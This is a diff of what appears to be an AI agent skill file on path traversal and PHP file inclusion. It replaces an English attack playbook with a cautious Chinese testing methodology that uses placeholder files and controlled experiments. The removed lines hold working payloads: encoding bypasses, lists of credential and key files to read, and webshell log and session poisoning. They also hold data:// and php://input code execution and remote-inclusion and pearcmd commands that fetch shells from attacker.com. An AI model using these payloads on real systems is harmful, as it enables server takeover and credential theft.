@@ -1,599 +1,213 @@
-# Detailed Workflow
+# Path Traversal / LFI 详细工作流
 
-# SKILL: Path Traversal / Local File Inclusion (LFI) — Expert Attack Playbook
+只在核心 skill 已经被当前证据触发后读取本资料。按问题读取对应章节；它提供判定
+条件和最小实验，不是固定路径字典或必须全部执行的 payload 清单。
 
-> **AI LOAD INSTRUCTION**: Expert path traversal and LFI techniques. Covers encoding bypass sequences, OS differences, filter bypass, PHP wrapper exploitation, log poisoning to RCE, and the critical distinction between path traversal (read only) vs LFI (execution). Base models miss encoding chains and RCE escalation paths.
+## 1. 技术边界
 
-## 0. RELATED ROUTING
+路径穿越是让文件系统解析结果离开应用预期目录。LFI 通常特指用户输入进入本地
+文件包含或求值操作；单纯任意文件读取不应自动报告为 LFI 执行。
 
-Before deep exploitation, you can first load:
+需要分别回答三个问题：
 
-- `upload insecure files` (related Skill; use `skill_list` to locate it) when the primary attack surface is an upload workflow rather than an include or read primitive
+1. 用户输入是否到达文件操作或包含操作？
+2. 最终解析出的资源是否超出预期边界，或是否允许未授权文件？
+3. 返回的是文件字节、源码文本，还是确实发生了模板/脚本求值？
 
-### First-pass traversal chains
+一个输入被接受、一个路径可访问、一个文件内容被返回和一段代码被执行，分别需要
+独立证据。已有权限也会受到进程身份、操作系统、容器挂载、wrapper 配置和应用层
+授权的限制。
+
+## 2. 从入口找到 sink
+
+从当前请求、响应、错误、前端调用或局部源码提取实际字段，不要根据参数名字猜漏洞。
+重点观察以下数据流：
+
+| 输入来源 | 可能的 sink | 首要区分 |
+| --- | --- | --- |
+| 查询、表单、JSON、Cookie、请求头 | `open`、`read`、下载响应、静态资源加载 | 是文件名、路径、对象 ID 还是显示名称 |
+| `page`、`template`、`layout` 等动态视图字段 | `include`、`require`、模板加载 | 内容被读取还是被求值 |
+| 上传、导入、转换或归档字段 | 临时文件、解压目录、任务参数、外部进程 | 路径控制是否经过第二个服务或异步任务 |
+| 数据库中的文件字段 | 下载、预览、导出接口 | 写入字段是否受保护，下载方是否重新校验路径 |
+
+源码只有在从入口到 sink 的链路实际连通时才算证据。注释、命名和前端隐藏字段是
+线索；它们不证明服务器存在对应路由或使用对应实现。
+
+## 3. 建立解析模型
+
+把一次请求拆成可观察的层：
 
 ```text
-../etc/passwd
-../../../../etc/passwd
-..%2f..%2f..%2fetc%2fpasswd
-..%252f..%252f..%252fetc%252fpasswd
-..\\..\\..\\windows\\win.ini
+原始请求
+  → HTTP/框架解码
+  → 参数类型与容器解析
+  → 应用替换、拼接或规范化
+  → 前缀/后缀处理
+  → 文件 API 或 include API
+  → 操作系统路径解析与权限检查
 ```
 
----
+记录每层已知行为。特别确认：
 
-## 1. CORE CONCEPT
+- URL 百分号解码发生几次，发生在过滤前还是过滤后；
+- 应用是否把输入拼到固定目录、固定后缀或固定协议前；
+- 是否使用 basename、白名单、规范化路径或目录边界检查；
+- POSIX 使用 `/`，Windows 还可能接受 `\\`、驱动器路径或 UNC 语义；
+- 进程的当前目录、身份、容器挂载和文件 API 是否与分析工具相同。
 
-**Path Traversal**: Read arbitrary files by escaping the intended directory with `../` sequences.
-**LFI**: In PHP, when user input controls `include()`/`require()` — file is **executed** as PHP code, not just read.
+同一字符串在不同层的表示可能不同。一次实验只改变一个层的变量，否则无法知道
+结果由解码、过滤、规范化还是权限造成。
 
-```
-http://target.com/index.php?page=home
-→ Opens: /var/www/html/pages/home.php
+## 4. 先做正常对照
 
-Traversal attack:
-http://target.com/index.php?page=../../../../etc/passwd
-→ Opens: /etc/passwd
-```
+选择当前目标明确提供的已知有效文件名、资源 ID 或本地 fixture，建立正常请求。保存：
 
----
+- HTTP 方法、路径、参数位置、会话和身份；
+- 状态码、重定向、Cookie、内容类型和响应长度；
+- 正文是否完整，以及应用返回的文件名、对象 ID 或错误标识。
 
-## 2. TRAVERSAL SEQUENCE VARIANTS
+再准备一个与正常值相邻但应不存在的对照。两个对照帮助区分“输入被处理”和“资源
+确实存在”。如果正常请求本身未建立，先修复前置条件；不要把后续失败归因于路径
+校验。
 
-The filtering strategy determines which encoding to use:
+## 5. 最小路径验证
 
-### Basic
-```
-../../../etc/passwd
-..\..\..\windows\system32\drivers\etc\hosts  (Windows)
-```
-
-### URL Encoding
-```
-%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd     ← %2f = '/'
-%2e%2e%5c%2e%2e%5c%2e%2e%5c                  ← %5c = '\'
-```
-
-### Double URL Encoding (when server decodes once, filter checks before decode)
-```
-%252e%252e%252f%252e%252e%252f  ← %25 = %, double-encoded %2e
-..%252f..%252fetc%252fpasswd
-```
-
-### Unicode / Overlong UTF-8
-```
-..%c0%af..%c0%af     ← overlong UTF-8 encoding of '/'
-..%c1%9c..%c1%9c     ← overlong UTF-8 encoding of '\'
-..%ef%bc%8f          ← fullwidth solidus '／'
-```
-
-### Mixed Encodings
-```
-..%2F..%2Fetc%2Fpasswd
-....//....//etc/passwd   ← double-dot with slash (filter strips single ../)
-```
-
-### Filter Strips `../` (so `../` becomes `../` after strip)
-```
-....//          ← becomes ../ after filter strips ../
-..././          ← becomes ../ after filter strips ./
-```
-
-### Null Byte Injection (legacy PHP < 5.3.4)
-```
-../../../../etc/passwd%00.jpg   ← %00 truncates string, strips .jpg extension
-../../../../etc/passwd%00.php
-```
-
----
-
-## 3. TARGET FILES AND ESCALATION TARGETS
-
-### Linux
-```
-/etc/passwd                  ← user list (usernames, UIDs)
-/etc/shadow                  ← password hashes (requires root-level file read)
-/etc/hosts                   ← internal hostnames → pivot targets
-/etc/hostname                ← server hostname
-/proc/self/environ           ← process environment (DB creds, API keys!)
-/proc/self/cmdline           ← process command line
-/proc/self/fd/0              ← stdin file descriptor
-/proc/[pid]/maps             ← memory maps (loaded libraries with paths)
-/var/log/apache2/access.log  ← for log poisoning
-/var/log/apache2/error.log
-/var/log/nginx/access.log
-/var/log/auth.log            ← SSH attempt log
-/var/mail/www-data            ← email for www-data user
-/home/USER/.ssh/id_rsa       ← SSH private key
-/home/USER/.ssh/authorized_keys
-/home/USER/.bash_history     ← command history (credentials!)
-/home/USER/.aws/credentials  ← AWS keys
-/tmp/sess_SESSIONID          ← PHP session files (if session.save_path=/tmp)
-```
-
-### Web Application Config Files
-```
-/var/www/html/.env           ← Laravel/Node.js env vars
-/var/www/html/config.php     ← PHP config
-/var/www/html/wp-config.php  ← WordPress DB credentials
-/etc/apache2/sites-enabled/  ← Apache vhosts
-/etc/nginx/sites-enabled/    ← Nginx config
-/usr/local/etc/nginx/nginx.conf
-```
-
-### Windows
-```
-C:\Windows\System32\drivers\etc\hosts
-C:\Windows\win.ini
-C:\Windows\System32\config\SAM          ← NTLM hashes (often locked)
-C:\inetpub\wwwroot\web.config           ← ASP.NET DB connection strings
-C:\inetpub\wwwroot\global.asa
-C:\xampp\htdocs\wp-config.php
-C:\Users\Administrator\.ssh\id_rsa
-C:\ProgramData\MySQL\MySQL Server 8\my.ini  ← MySQL config
-```
-
----
-
-## 4. PHP LFI → RCE TECHNIQUES
-
-### Log Poisoning (most reliable when log is accessible)
-**Step 1**: Inject PHP code into Apache/Nginx access log via User-Agent:
-```http
-GET / HTTP/1.1
-User-Agent: <?php system($_GET['cmd']); ?>
-```
-**Step 2**: Include the log file via LFI:
-```
-?page=../../../../var/log/apache2/access.log&cmd=id
-```
-
-### SSH Log Poisoning
-Inject PHP payload as SSH username:
-```bash
-ssh '<?php system($_GET["cmd"]); ?>'@target.com
-```
-Then include `/var/log/auth.log`.
-
-### PHP Session File Poisoning
-**Step 1**: Send PHP code in session-stored parameter (e.g., username), triggering storage in session file
-**Step 2**: Include session file:
-```
-?page=../../../../tmp/sess_SESSIONID&cmd=id
-```
-Find session ID from cookie `PHPSESSID`.
-
-### PHP Wrappers for RCE
-
-**`php://expect` wrapper** (requires `expect` PHP extension):
-```
-?page=expect://id
-```
-
-**`php://input` wrapper** (combine LFI with POST body):
-```
-POST ?page=php://input
-Body: <?php system('id'); ?>
-```
-
-**`data://` wrapper** (inject PHP directly as base64):
-```
-?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id
-```
-(PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4= = `<?php system($_GET['cmd']); ?>`)
-
----
-
-## 5. PHP FILTER WRAPPER (FILE CONTENT READ)
-
-Use `php://filter` to base64-encode file content to avoid null bytes, binary data:
-```
-?page=php://filter/convert.base64-encode/resource=config.php
-?page=php://filter/convert.base64-encode/resource=/etc/passwd
-?page=php://filter/read=string.rot13/resource=config.php
-?page=php://filter/convert.iconv.UTF-8.UTF-16LE/resource=config.php
-```
-Decode the returned base64 to see the file contents (including PHP source code).
-
-**Chain filters** (multiple transforms to bypass input filters):
-```
-?page=php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/passwd
-```
-
----
-
-## 6. REMOTE FILE INCLUSION (RFI) — WHEN ENABLED
-
-If PHP's `allow_url_include = On` (rare but exists):
-```
-?page=http://attacker.com/shell.txt
-?page=ftp://attacker.com/shell.php
-```
-Host a `shell.txt` with `<?php system($_GET['cmd']); ?>`.
-
----
-
-## 7. SERVER-SPECIFIC PATH TRUNCATION
-
-PHP has a historical path length limit. Pad with `.` or `/./` to truncate appended extension:
-```
-?page=../../../../etc/passwd/./././././././././././............ (255+ chars)
-```
-When server appends `.php`, the truncation drops it.
-
-Or null byte if PHP < 5.3.4:
-```
-?page=../../../../etc/passwd%00
-```
-
----
-
-## 8. PARAMETER LOCATIONS TO TEST
-
-```
-?file=        ?page=        ?include=    ?path=
-?doc=         ?view=        ?load=       ?read=
-?template=    ?lang=        ?url=        ?src=
-?content=     ?site=        ?layout=     ?module=
-```
-
-Also test: HTTP headers, cookies, form `action` values, import/upload features.
-
----
-
-## 9. FILTER BYPASS CHECKLIST
-
-When `../` is stripped or blocked:
-
-```
-□ Try URL encoding: %2e%2e%2f
-□ Try double URL encoding: %252e%252e%252f
-□ Try overlong UTF-8: ..%c0%af / ..%ef%bc%8f
-□ Try mixed: ..%2F or ..%5C (backslash on Linux)
-□ Try redundant sequences: ....// or ..././ (strip once → still ../)
-□ Try null byte: /../../../etc/passwd%00
-□ Try absolute path: /etc/passwd (if no path prefix added)
-□ Try Windows UNC (Windows server): \\127.0.0.1\C$\Windows\win.ini
-```
-
----
-
-## 10. IMPACT ESCALATION PATH
-
-```
-Path traversal (read arbitrary files)
-├── Read /etc/passwd → enumerate users
-├── Read /proc/self/environ → find API keys, DB passwords in env
-├── Read app config files → find credentials → horizontal movement
-├── Read SSH private keys → direct server login
-└── Find log paths → Log Poisoning → LFI RCE
-
-LFI (PHP code inclusion)
-├── Log poisoning → webshell
-├── Session file poisoning → webshell  
-├── php://input → direct code execution
-├── data:// → direct code execution
-└── php://filter → read PHP source code → find more vulnerabilities
-```
-
----
-
-## 11. LFI TO RCE ESCALATION PATHS
-
-| Method | Requirements | Payload |
-|---|---|---|
-| Log Poisoning (Apache) | LFI + Apache access.log readable | Inject `<?php system($_GET['c']);?>` in User-Agent → include `/var/log/apache2/access.log` |
-| Log Poisoning (SSH) | LFI + SSH auth.log readable | SSH as `<?php system('id');?>@target` → include `/var/log/auth.log` |
-| Log Poisoning (Mail) | LFI + mail log readable | Send email with PHP in subject → include `/var/log/mail.log` |
-| /proc/self/fd bruteforce | LFI + Linux | Bruteforce `/proc/self/fd/0` through `/proc/self/fd/255` for open file handles containing injected content |
-| /proc/self/environ | LFI + CGI/FastCGI | Inject PHP in `User-Agent` header → include `/proc/self/environ` |
-| iconv CVE-2024-2961 | glibc < 2.39, PHP with `php://filter` | `php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=` chain to heap overflow → RCE. Tool: cnext-exploits |
-| phpinfo() assisted | LFI + phpinfo page accessible | Race condition: upload tmp file via multipart to phpinfo → read tmp path from response → include before cleanup |
-| PHP Session | LFI + session file writable | Inject PHP into session via controllable session variable → include `/tmp/sess_SESSIONID` or `/var/lib/php/sessions/sess_SESSIONID` |
-| Upload race | LFI + upload endpoint | Upload PHP file → include before server-side validation/deletion |
-
----
-
-## 12. PHP WRAPPER EXPLOITATION MATRIX
-
-### php://filter (most powerful, always try first)
+使用当前目标或 fixture 提供的 `<known-file>`，不要把固定系统文件或固定 flag 路径
+当作起手答案。抽象请求形状如下：
 
 ```text
-php://filter/convert.base64-encode/resource=index.php
-php://filter/read=string.rot13/resource=index.php
-php://filter/convert.iconv.utf-8.utf-16/resource=index.php
-php://filter/zlib.deflate/resource=index.php
+file=<known-file>
+file=../<known-file>
+file=..%2f<known-file>
+file=..%252f<known-file>
+file=/<absolute-known-file>
 ```
 
-**Filter chain RCE** (synacktiv php_filter_chain_generator):
+按以下顺序解释结果：
 
-- Chain multiple `convert.iconv` filters to write arbitrary bytes without file upload
-- Tool: `synacktiv/php_filter_chain_generator` → generates chain that writes PHP code
-- `python3 php_filter_chain_generator.py --chain '<?php system("id");?>'`
+1. 正常值成功，父目录变体失败：可能存在边界检查，也可能只是基准目录或后缀不正确；
+   需要看错误类别和源码/运行时证据。
+2. 父目录变体成功读取已知文件：证明路径控制越过了预期目录的可能性，但仍需记录
+   能读取的身份、进程和文件范围。
+3. 绝对路径变体成功：说明某一层可能直接接受绝对路径；若应用先拼固定前缀，结果
+   也可能只是普通文件名失败，不能仅凭状态码下结论。
+4. 变体均失败：分别检查会话、基准目录、解码层、固定后缀、权限和响应截断；不要
+   直接报告“没有路径穿越”。
 
-**convert.iconv + dechunk oracle** (blind file read):
+相对路径深度应由已知基准目录和已知文件计算。多余的父目录在某些操作系统/API 中
+会停留在根目录，在另一些实现中会被拒绝；以当前运行时结果为准，不套用其他目标
+的层数。
 
-- Tool: `synacktiv/php_filter_chains_oracle_exploit` (filters_chain_oracle_exploit)
-- Enables blind LFI to read file contents character by character
+## 6. 编码与过滤差异
 
-### php://input
+只有观察到对应解析层，或正常与无害变体已经证明某种过滤顺序时，才选择变体：
+
+| 变体 | 适用前提 | 需要确认 |
+| --- | --- | --- |
+| `../<known-file>` | 基础路径语义 | 是否进入最终文件 API |
+| `..%2f<known-file>` | URL/表单会解码 `%2f` | 解码发生在过滤前还是过滤后 |
+| `..%252f<known-file>` | 存在两层解码 | 第二层由哪个组件执行 |
+| `..\\<known-file>` | Windows 或应用明确接受反斜杠 | 应用与 OS 的分隔符语义 |
+| 混合分隔符/点段 | 已观察到单次替换或点段处理 | 最终规范化结果，而非原始字符串 |
+
+一次只测试一个编码层。现代运行时通常会拒绝过时或不规范的编码；不要把过长 UTF-8
+序列、空字节或其他历史行为列为默认步骤。只有目标版本、库行为或错误信息明确支持
+时，才把它们作为受条件约束的实验，并记录版本前提。
+
+“过滤掉父目录片段”不是安全结论。要判断过滤是否在解码前发生、是否只替换一次、
+是否在最终 API 前规范化，以及规范化后是否检查了预期目录边界。改变请求规模或使用
+更多字典不会替代这一层判断。
+
+## 7. 前缀、后缀与对象 ID
+
+常见实现形状包括：
 
 ```text
-POST vulnerable.php?page=php://input
-Body: <?php system('id'); ?>
+base + user_value
+base + user_value + suffix
+lookup(object_id).stored_path
+include(user_value)
 ```
 
-Requires `allow_url_include=On`
+对每种形状分别验证：
 
-### data://
+- 固定前缀是否始终保留；
+- 后缀是在规范化前还是后追加；
+- 对象 ID 是否先查数据库，再把受保护字段交给下载器；
+- 数据库字段是否经过第二次 canonical path 检查；
+- 文件读取失败时返回的是应用错误还是底层错误。
+
+对象 ID 看起来是数字或随机值，并不等于安全；同样，能控制显示名称也不等于能控制
+文件路径。只有数据流抵达文件 sink 才进入路径穿越判断。
+
+## 8. 读取、包含和 PHP wrapper
+
+读取型 sink 通常把文件字节作为响应或任务输出返回。包含型 sink 可能把目标解释为
+代码或模板；确认时需要当前应用确实经过 include/require/模板求值，并观察无害、明确
+的求值证据。源码中出现脚本文本、错误栈或模板标记不代表已经执行。
+
+在已确认 PHP 且当前读取点支持 stream wrapper 时，`php://filter` 可用于改变读取流的
+表示形式。例如对当前证据指向的应用文件，可用抽象形状：
 
 ```text
-data://text/plain,<?php system('id');?>
-data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
-data:text/plain,<?php system('id');?>    ← note: no double slash variant also works
+php://filter/read=convert.base64-encode/resource=<known-app-file>
 ```
 
-### phar://
+这类转换适合判断源码读取和二进制/编码完整性；它不是代码执行证明。是否可用取决于
+PHP 版本、参数过滤、wrapper 配置、路径解析和输出长度。其他具备特殊语义的 wrapper
+也必须逐项确认目标版本、调用点和配置，不能从“PHP 存在”推断全部开启。
+
+路径穿越 skill 到此返回已验证的读取/包含能力和限制。若后续需要命令执行、反序列化、
+上传利用或服务间跳转，转交对应 skill，并重新建立该能力的独立对照。
+
+## 9. 失败结果诊断
+
+| 现象 | 可能含义 | 最小下一步 |
+| --- | --- | --- |
+| 已知文件成功，候选返回 404 | 文件不存在、基准错误、后缀追加或被规范化 | 重读实际基准/后缀证据，换一个当前已知文件对照 |
+| 403/权限错误 | 应用授权、文件权限或网关拒绝 | 用同一会话访问正常控制，区分身份和文件权限 |
+| 302 到登录 | 会话丢失、扫描污染或请求顺序不对 | 复验已知认证控制，不把结果当成路径不存在 |
+| 400/422 | 参数 schema、编码或类型校验失败 | 保留正常请求，只改一个参数层 |
+| 5xx | 解析、数据库、模板或底层文件错误 | 与正常/无效值做一变量对照，保留错误层次 |
+| 响应长度异常或正文为空 | 截断、二进制、过滤器或异步输出未读取 | 检查完整性和结果句柄，不重复提交相同请求 |
+
+结论范围必须绑定到实际输入、endpoint、会话、身份、客户端、版本和运行环境。一个
+失败变体只能排除该变体及其条件。
+
+## 10. 安全实现对照
+
+审计安全实现时，优先寻找以下不变量：
+
+- 用户提交的是固定索引或服务端映射值，而不是路径片段；
+- 对路径做规范化后，再验证它仍位于预期目录及其子目录；
+- 边界检查包含目录分隔符，避免只做字符串前缀比较；
+- 处理符号链接、大小写差异、驱动器/UNC 语义和不同平台分隔符；
+- 对 include 场景限制为固定 allowlist，并关闭不需要的远程 wrapper；
+- 文件权限、容器挂载和错误响应不会额外扩大读取范围。
+
+发现其中一项实现并不自动证明其他层安全或不安全；仍需沿实际数据流和运行时行为验证。
+
+## 11. 有限实验记录
+
+每个分支使用如下记录，直到回答一个问题即可停止：
 
 ```text
-phar://uploaded.phar/test.php
+问题：
+正常对照：
+唯一变化：
+请求/证据引用：
+响应信号：
+支持或排除的事实：
+仍未知：
+停止条件：
 ```
 
-Triggers deserialization of phar metadata → RCE via POP chain (requires file upload of crafted phar, can be disguised as JPEG)
+若两个有效测试没有带来新信息，重新检查前提或换一个能区分假设的条件；不要只增加
+路径字典。确认能力后立即转入目标载体定位或其他必要技术 skill。
 
-### zip://
+## 12. 参考资料
 
-```text
-zip://uploaded.zip%23shell.php
-```
-
-### expect://
-
-```text
-expect://id
-```
-
-Requires `expect` extension (rare)
-
----
-
-## 13. PEARCMD LFI EXPLOITATION
-
-When `pearcmd.php` is accessible via LFI (common in Docker PHP images):
-
-| Method | Payload |
-|---|---|
-| config-create | `/?file=pearcmd.php&+config-create+/<?=phpinfo()?>+/tmp/shell.php` |
-| man_dir | `/?file=pearcmd.php&+-c+/tmp/shell.php+-d+man_dir=<?=phpinfo()?>+-s+` |
-| download | `/?file=pearcmd.php&+download+http://attacker.com/shell.php` |
-| install | `/?file=pearcmd.php&+install+http://attacker.com/shell.tgz` |
-
----
-
-## 14. WINDOWS-SPECIFIC LFI TECHNIQUES
-
-**FindFirstFile wildcard** (Windows only):
-
-- `<` matches any single character, `>` matches any sequence (similar to `?` and `*` but in file APIs)
-- `php<<` can match `php5`, `phtml`, etc.
-- `..\..\windows\win.ini` → use `<<` for fuzzy matching: `..\..\windows\win<<`
-
----
-
-## 15. PARAMETER NAMING PATTERNS (HIGH-FREQUENCY TARGETS)
-
-Based on vulnerability research statistical analysis:
-
-| Parameter Name | Frequency | Context |
-|---|---|---|
-| `filename`, `file`, `path` | Very High | Direct file operations |
-| `page`, `include`, `template` | High | Template/page inclusion |
-| `url`, `src`, `href` | High | Resource loading |
-| `download`, `read`, `load` | Medium | File download/read |
-| `dir`, `folder`, `root` | Medium | Directory operations |
-| `hdfile`, `inputFile`, `XFileName` | Low | CMS/middleware specific |
-| `FileUrl`, `filePath`, `docPath` | Low | Enterprise app specific |
-
-High-frequency vulnerable endpoints:
-
-`down.php`, `download.jsp`, `download.asp`, `readfile.php`, `file_download.php`, `getfile.php`, `view.php`
-
----
-
-## 16. LFI TO RCE — ESCALATION PATHS
-
-### 1. /proc/self/fd Brute-Force
-```
-# When file upload exists but path is unknown:
-# Uploaded files get temporary fd in /proc/self/fd/
-# Brute-force fd numbers:
-/proc/self/fd/0 through /proc/self/fd/255
-# Include the temp file before it's cleaned up
-```
-
-### 2. /proc/self/environ Poisoning
-```
-# If User-Agent is reflected in process environment:
-GET /vuln.php?page=/proc/self/environ
-User-Agent: <?php system($_GET['c']); ?>
-```
-
-### 3. Log Poisoning
-```
-# Apache access log:
-GET /<?php system($_GET['c']); ?> HTTP/1.1
-# Then include: /var/log/apache2/access.log
-
-# SSH auth log (username field):
-ssh '<?php system($_GET["c"]); ?>'@target
-# Then include: /var/log/auth.log
-
-# Mail log (SMTP subject):
-MAIL FROM:<attacker@evil.com>
-RCPT TO:<victim@target.com>
-DATA
-Subject: <?php system($_GET['c']); ?>
-.
-# Then include: /var/log/mail.log
-```
-
-### 4. PHP Session File Poisoning
-```
-# Set session variable to PHP code:
-GET /page.php?lang=<?php system($_GET['c']); ?>
-# Session file: /tmp/sess_PHPSESSID or /var/lib/php/sessions/sess_PHPSESSID
-# Include the session file
-```
-
-### 5. phpinfo() Assisted LFI
-```
-# Race condition: upload via phpinfo() temp file
-# 1. POST multipart file to phpinfo() page → reveals tmp_name (/tmp/phpXXXXXX)
-# 2. Include the temp file before PHP cleans it up
-# Requires many concurrent requests (race window ~10ms)
-```
-
-### 6. iconv CVE-2024-2961
-```
-# glibc iconv buffer overflow in PHP filter chains
-# Tool: cfreal/cnext-exploits
-# Converts LFI to RCE without needing writable paths or log poisoning
-```
-
----
-
-## 17. PHP WRAPPER EXPLOITATION MATRIX
-
-### php://filter (file read without execution)
-```
-# Base64 encode source code:
-php://filter/convert.base64-encode/resource=index.php
-
-# ROT13:
-php://filter/read=string.rot13/resource=index.php
-
-# Chain multiple filters:
-php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php
-
-# Zlib compression:
-php://filter/zlib.deflate/resource=index.php
-
-# NEW: Filter chain RCE (synacktiv php_filter_chain_generator)
-# Generates chains that write arbitrary content via iconv conversions
-# Tool: synacktiv/php_filter_chain_generator
-python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
-# Produces: php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...|/resource=php://temp
-```
-
-### convert.iconv + dechunk Oracle (blind file read)
-```
-# Error-based oracle: determine if first byte of file matches a character
-# Tool: synacktiv/php_filter_chains_oracle_exploit
-# Reads files byte-by-byte through error/behavior differences
-```
-
-### data:// Wrapper
-```
-# Execute arbitrary PHP:
-data://text/plain,<?php system('id'); ?>
-data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
-
-# Bypass when data:// is filtered but data: (without //) works:
-data:text/plain,<?php system('id'); ?>
-```
-
-### expect:// Wrapper
-```
-expect://id
-expect://ls
-# Requires expect extension (rare but check)
-```
-
-### php://input
-```
-POST /vuln.php?page=php://input
-Content-Type: application/x-www-form-urlencoded
-
-<?php system('id'); ?>
-```
-
-### zip:// and phar:// Wrappers
-```
-# zip://: Upload ZIP containing PHP file
-zip:///tmp/upload.zip#shell.php
-
-# phar://: Triggers deserialization of phar metadata!
-phar:///tmp/upload.phar/anything
-# Create malicious phar with crafted metadata object
-# Can chain to RCE via POP gadget chains (like PHP deserialization)
-# Phar can be disguised as JPG (polyglot phar-jpg)
-```
-
-### wrapwrap (prefix/suffix injection)
-```
-# Tool: ambionics/wrapwrap
-# Adds arbitrary prefix and suffix to file content via filter chains
-# Useful for converting file read into XXE, SSRF, or deserialization trigger
-```
-
----
-
-## 18. PEARCMD LFI TO RCE
-
-When PEAR is installed and `register_argc_argv=On` (common in Docker PHP images):
-
-```
-# Method 1: config-create (write arbitrary content to file)
-GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/shell.php
-
-# Method 2: man_dir (change docs directory to write path)
-GET /index.php?+-c+/tmp/shell.php+-d+man_dir=<?=system($_GET[0])?>+-s+/usr/local/lib/php/pearcmd.php
-
-# Method 3: download (fetch remote file)
-GET /index.php?+download+http://attacker.com/shell.php&file=/usr/local/lib/php/pearcmd.php
-
-# Method 4: install (install remote package)
-GET /index.php?+install+http://attacker.com/evil.tgz&file=/usr/local/lib/php/pearcmd.php
-```
-
-### Windows FindFirstFile Wildcard
-```
-# Windows << and > wildcards in file paths:
-# << matches any extension, > matches single char
-include("php<<");      # Matches any .php* file
-include("shel>");      # Matches shell.php if only 1 char follows
-# Useful when exact filename is unknown
-```
-
----
-
-## 19. PARAMETER NAMING PATTERNS & HIGH-FREQUENCY ENDPOINTS
-
-### Common Vulnerable Parameter Names
-```
-filename    filepath    path        file        url
-template    page        include     dir         document
-folder      root        pg          lang        doc
-conf        data        content     name        src
-inputFile   hdfile      XFileName   FileUrl     readfile
-```
-
-### High-Frequency Vulnerable Endpoints
-| Endpoint Pattern | Frequency |
-|---|---|
-| `down.php` / `download.php` | Very High |
-| `download.jsp` / `download.do` | Very High |
-| `download.asp` / `download.aspx` | High |
-| `readfile.php` / `file.php` | High |
-| `export` / `report` endpoints | Medium |
-| `template` / `preview` endpoints | Medium |
-
-### Bypass Technique Distribution (from field research)
-| Technique | Prevalence |
-|---|---|
-| Absolute path direct access | Most common |
-| WEB-INF/web.xml read (Java) | Common |
-| Base64 encoded path parameter | Moderate |
-| Double URL encoding | Moderate |
-| UTF-8 overlong encoding (`%c0%ae`) | Rare but effective |
-| Null byte truncation (`%00`) | Legacy (PHP < 5.3.4) |
+- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)：路径穿越概念、编码层和边界校验建议。
+- [PHP Supported Protocols and Wrappers](https://www.php.net/manual/en/wrappers.php)：PHP wrapper 总览。
+- [PHP `php://` wrapper](https://www.php.net/manual/en/wrappers.php.php)：PHP 内置流 wrapper 行为。
+- [PHP `include`](https://www.php.net/manual/en/function.include.php)：包含与求值语义。
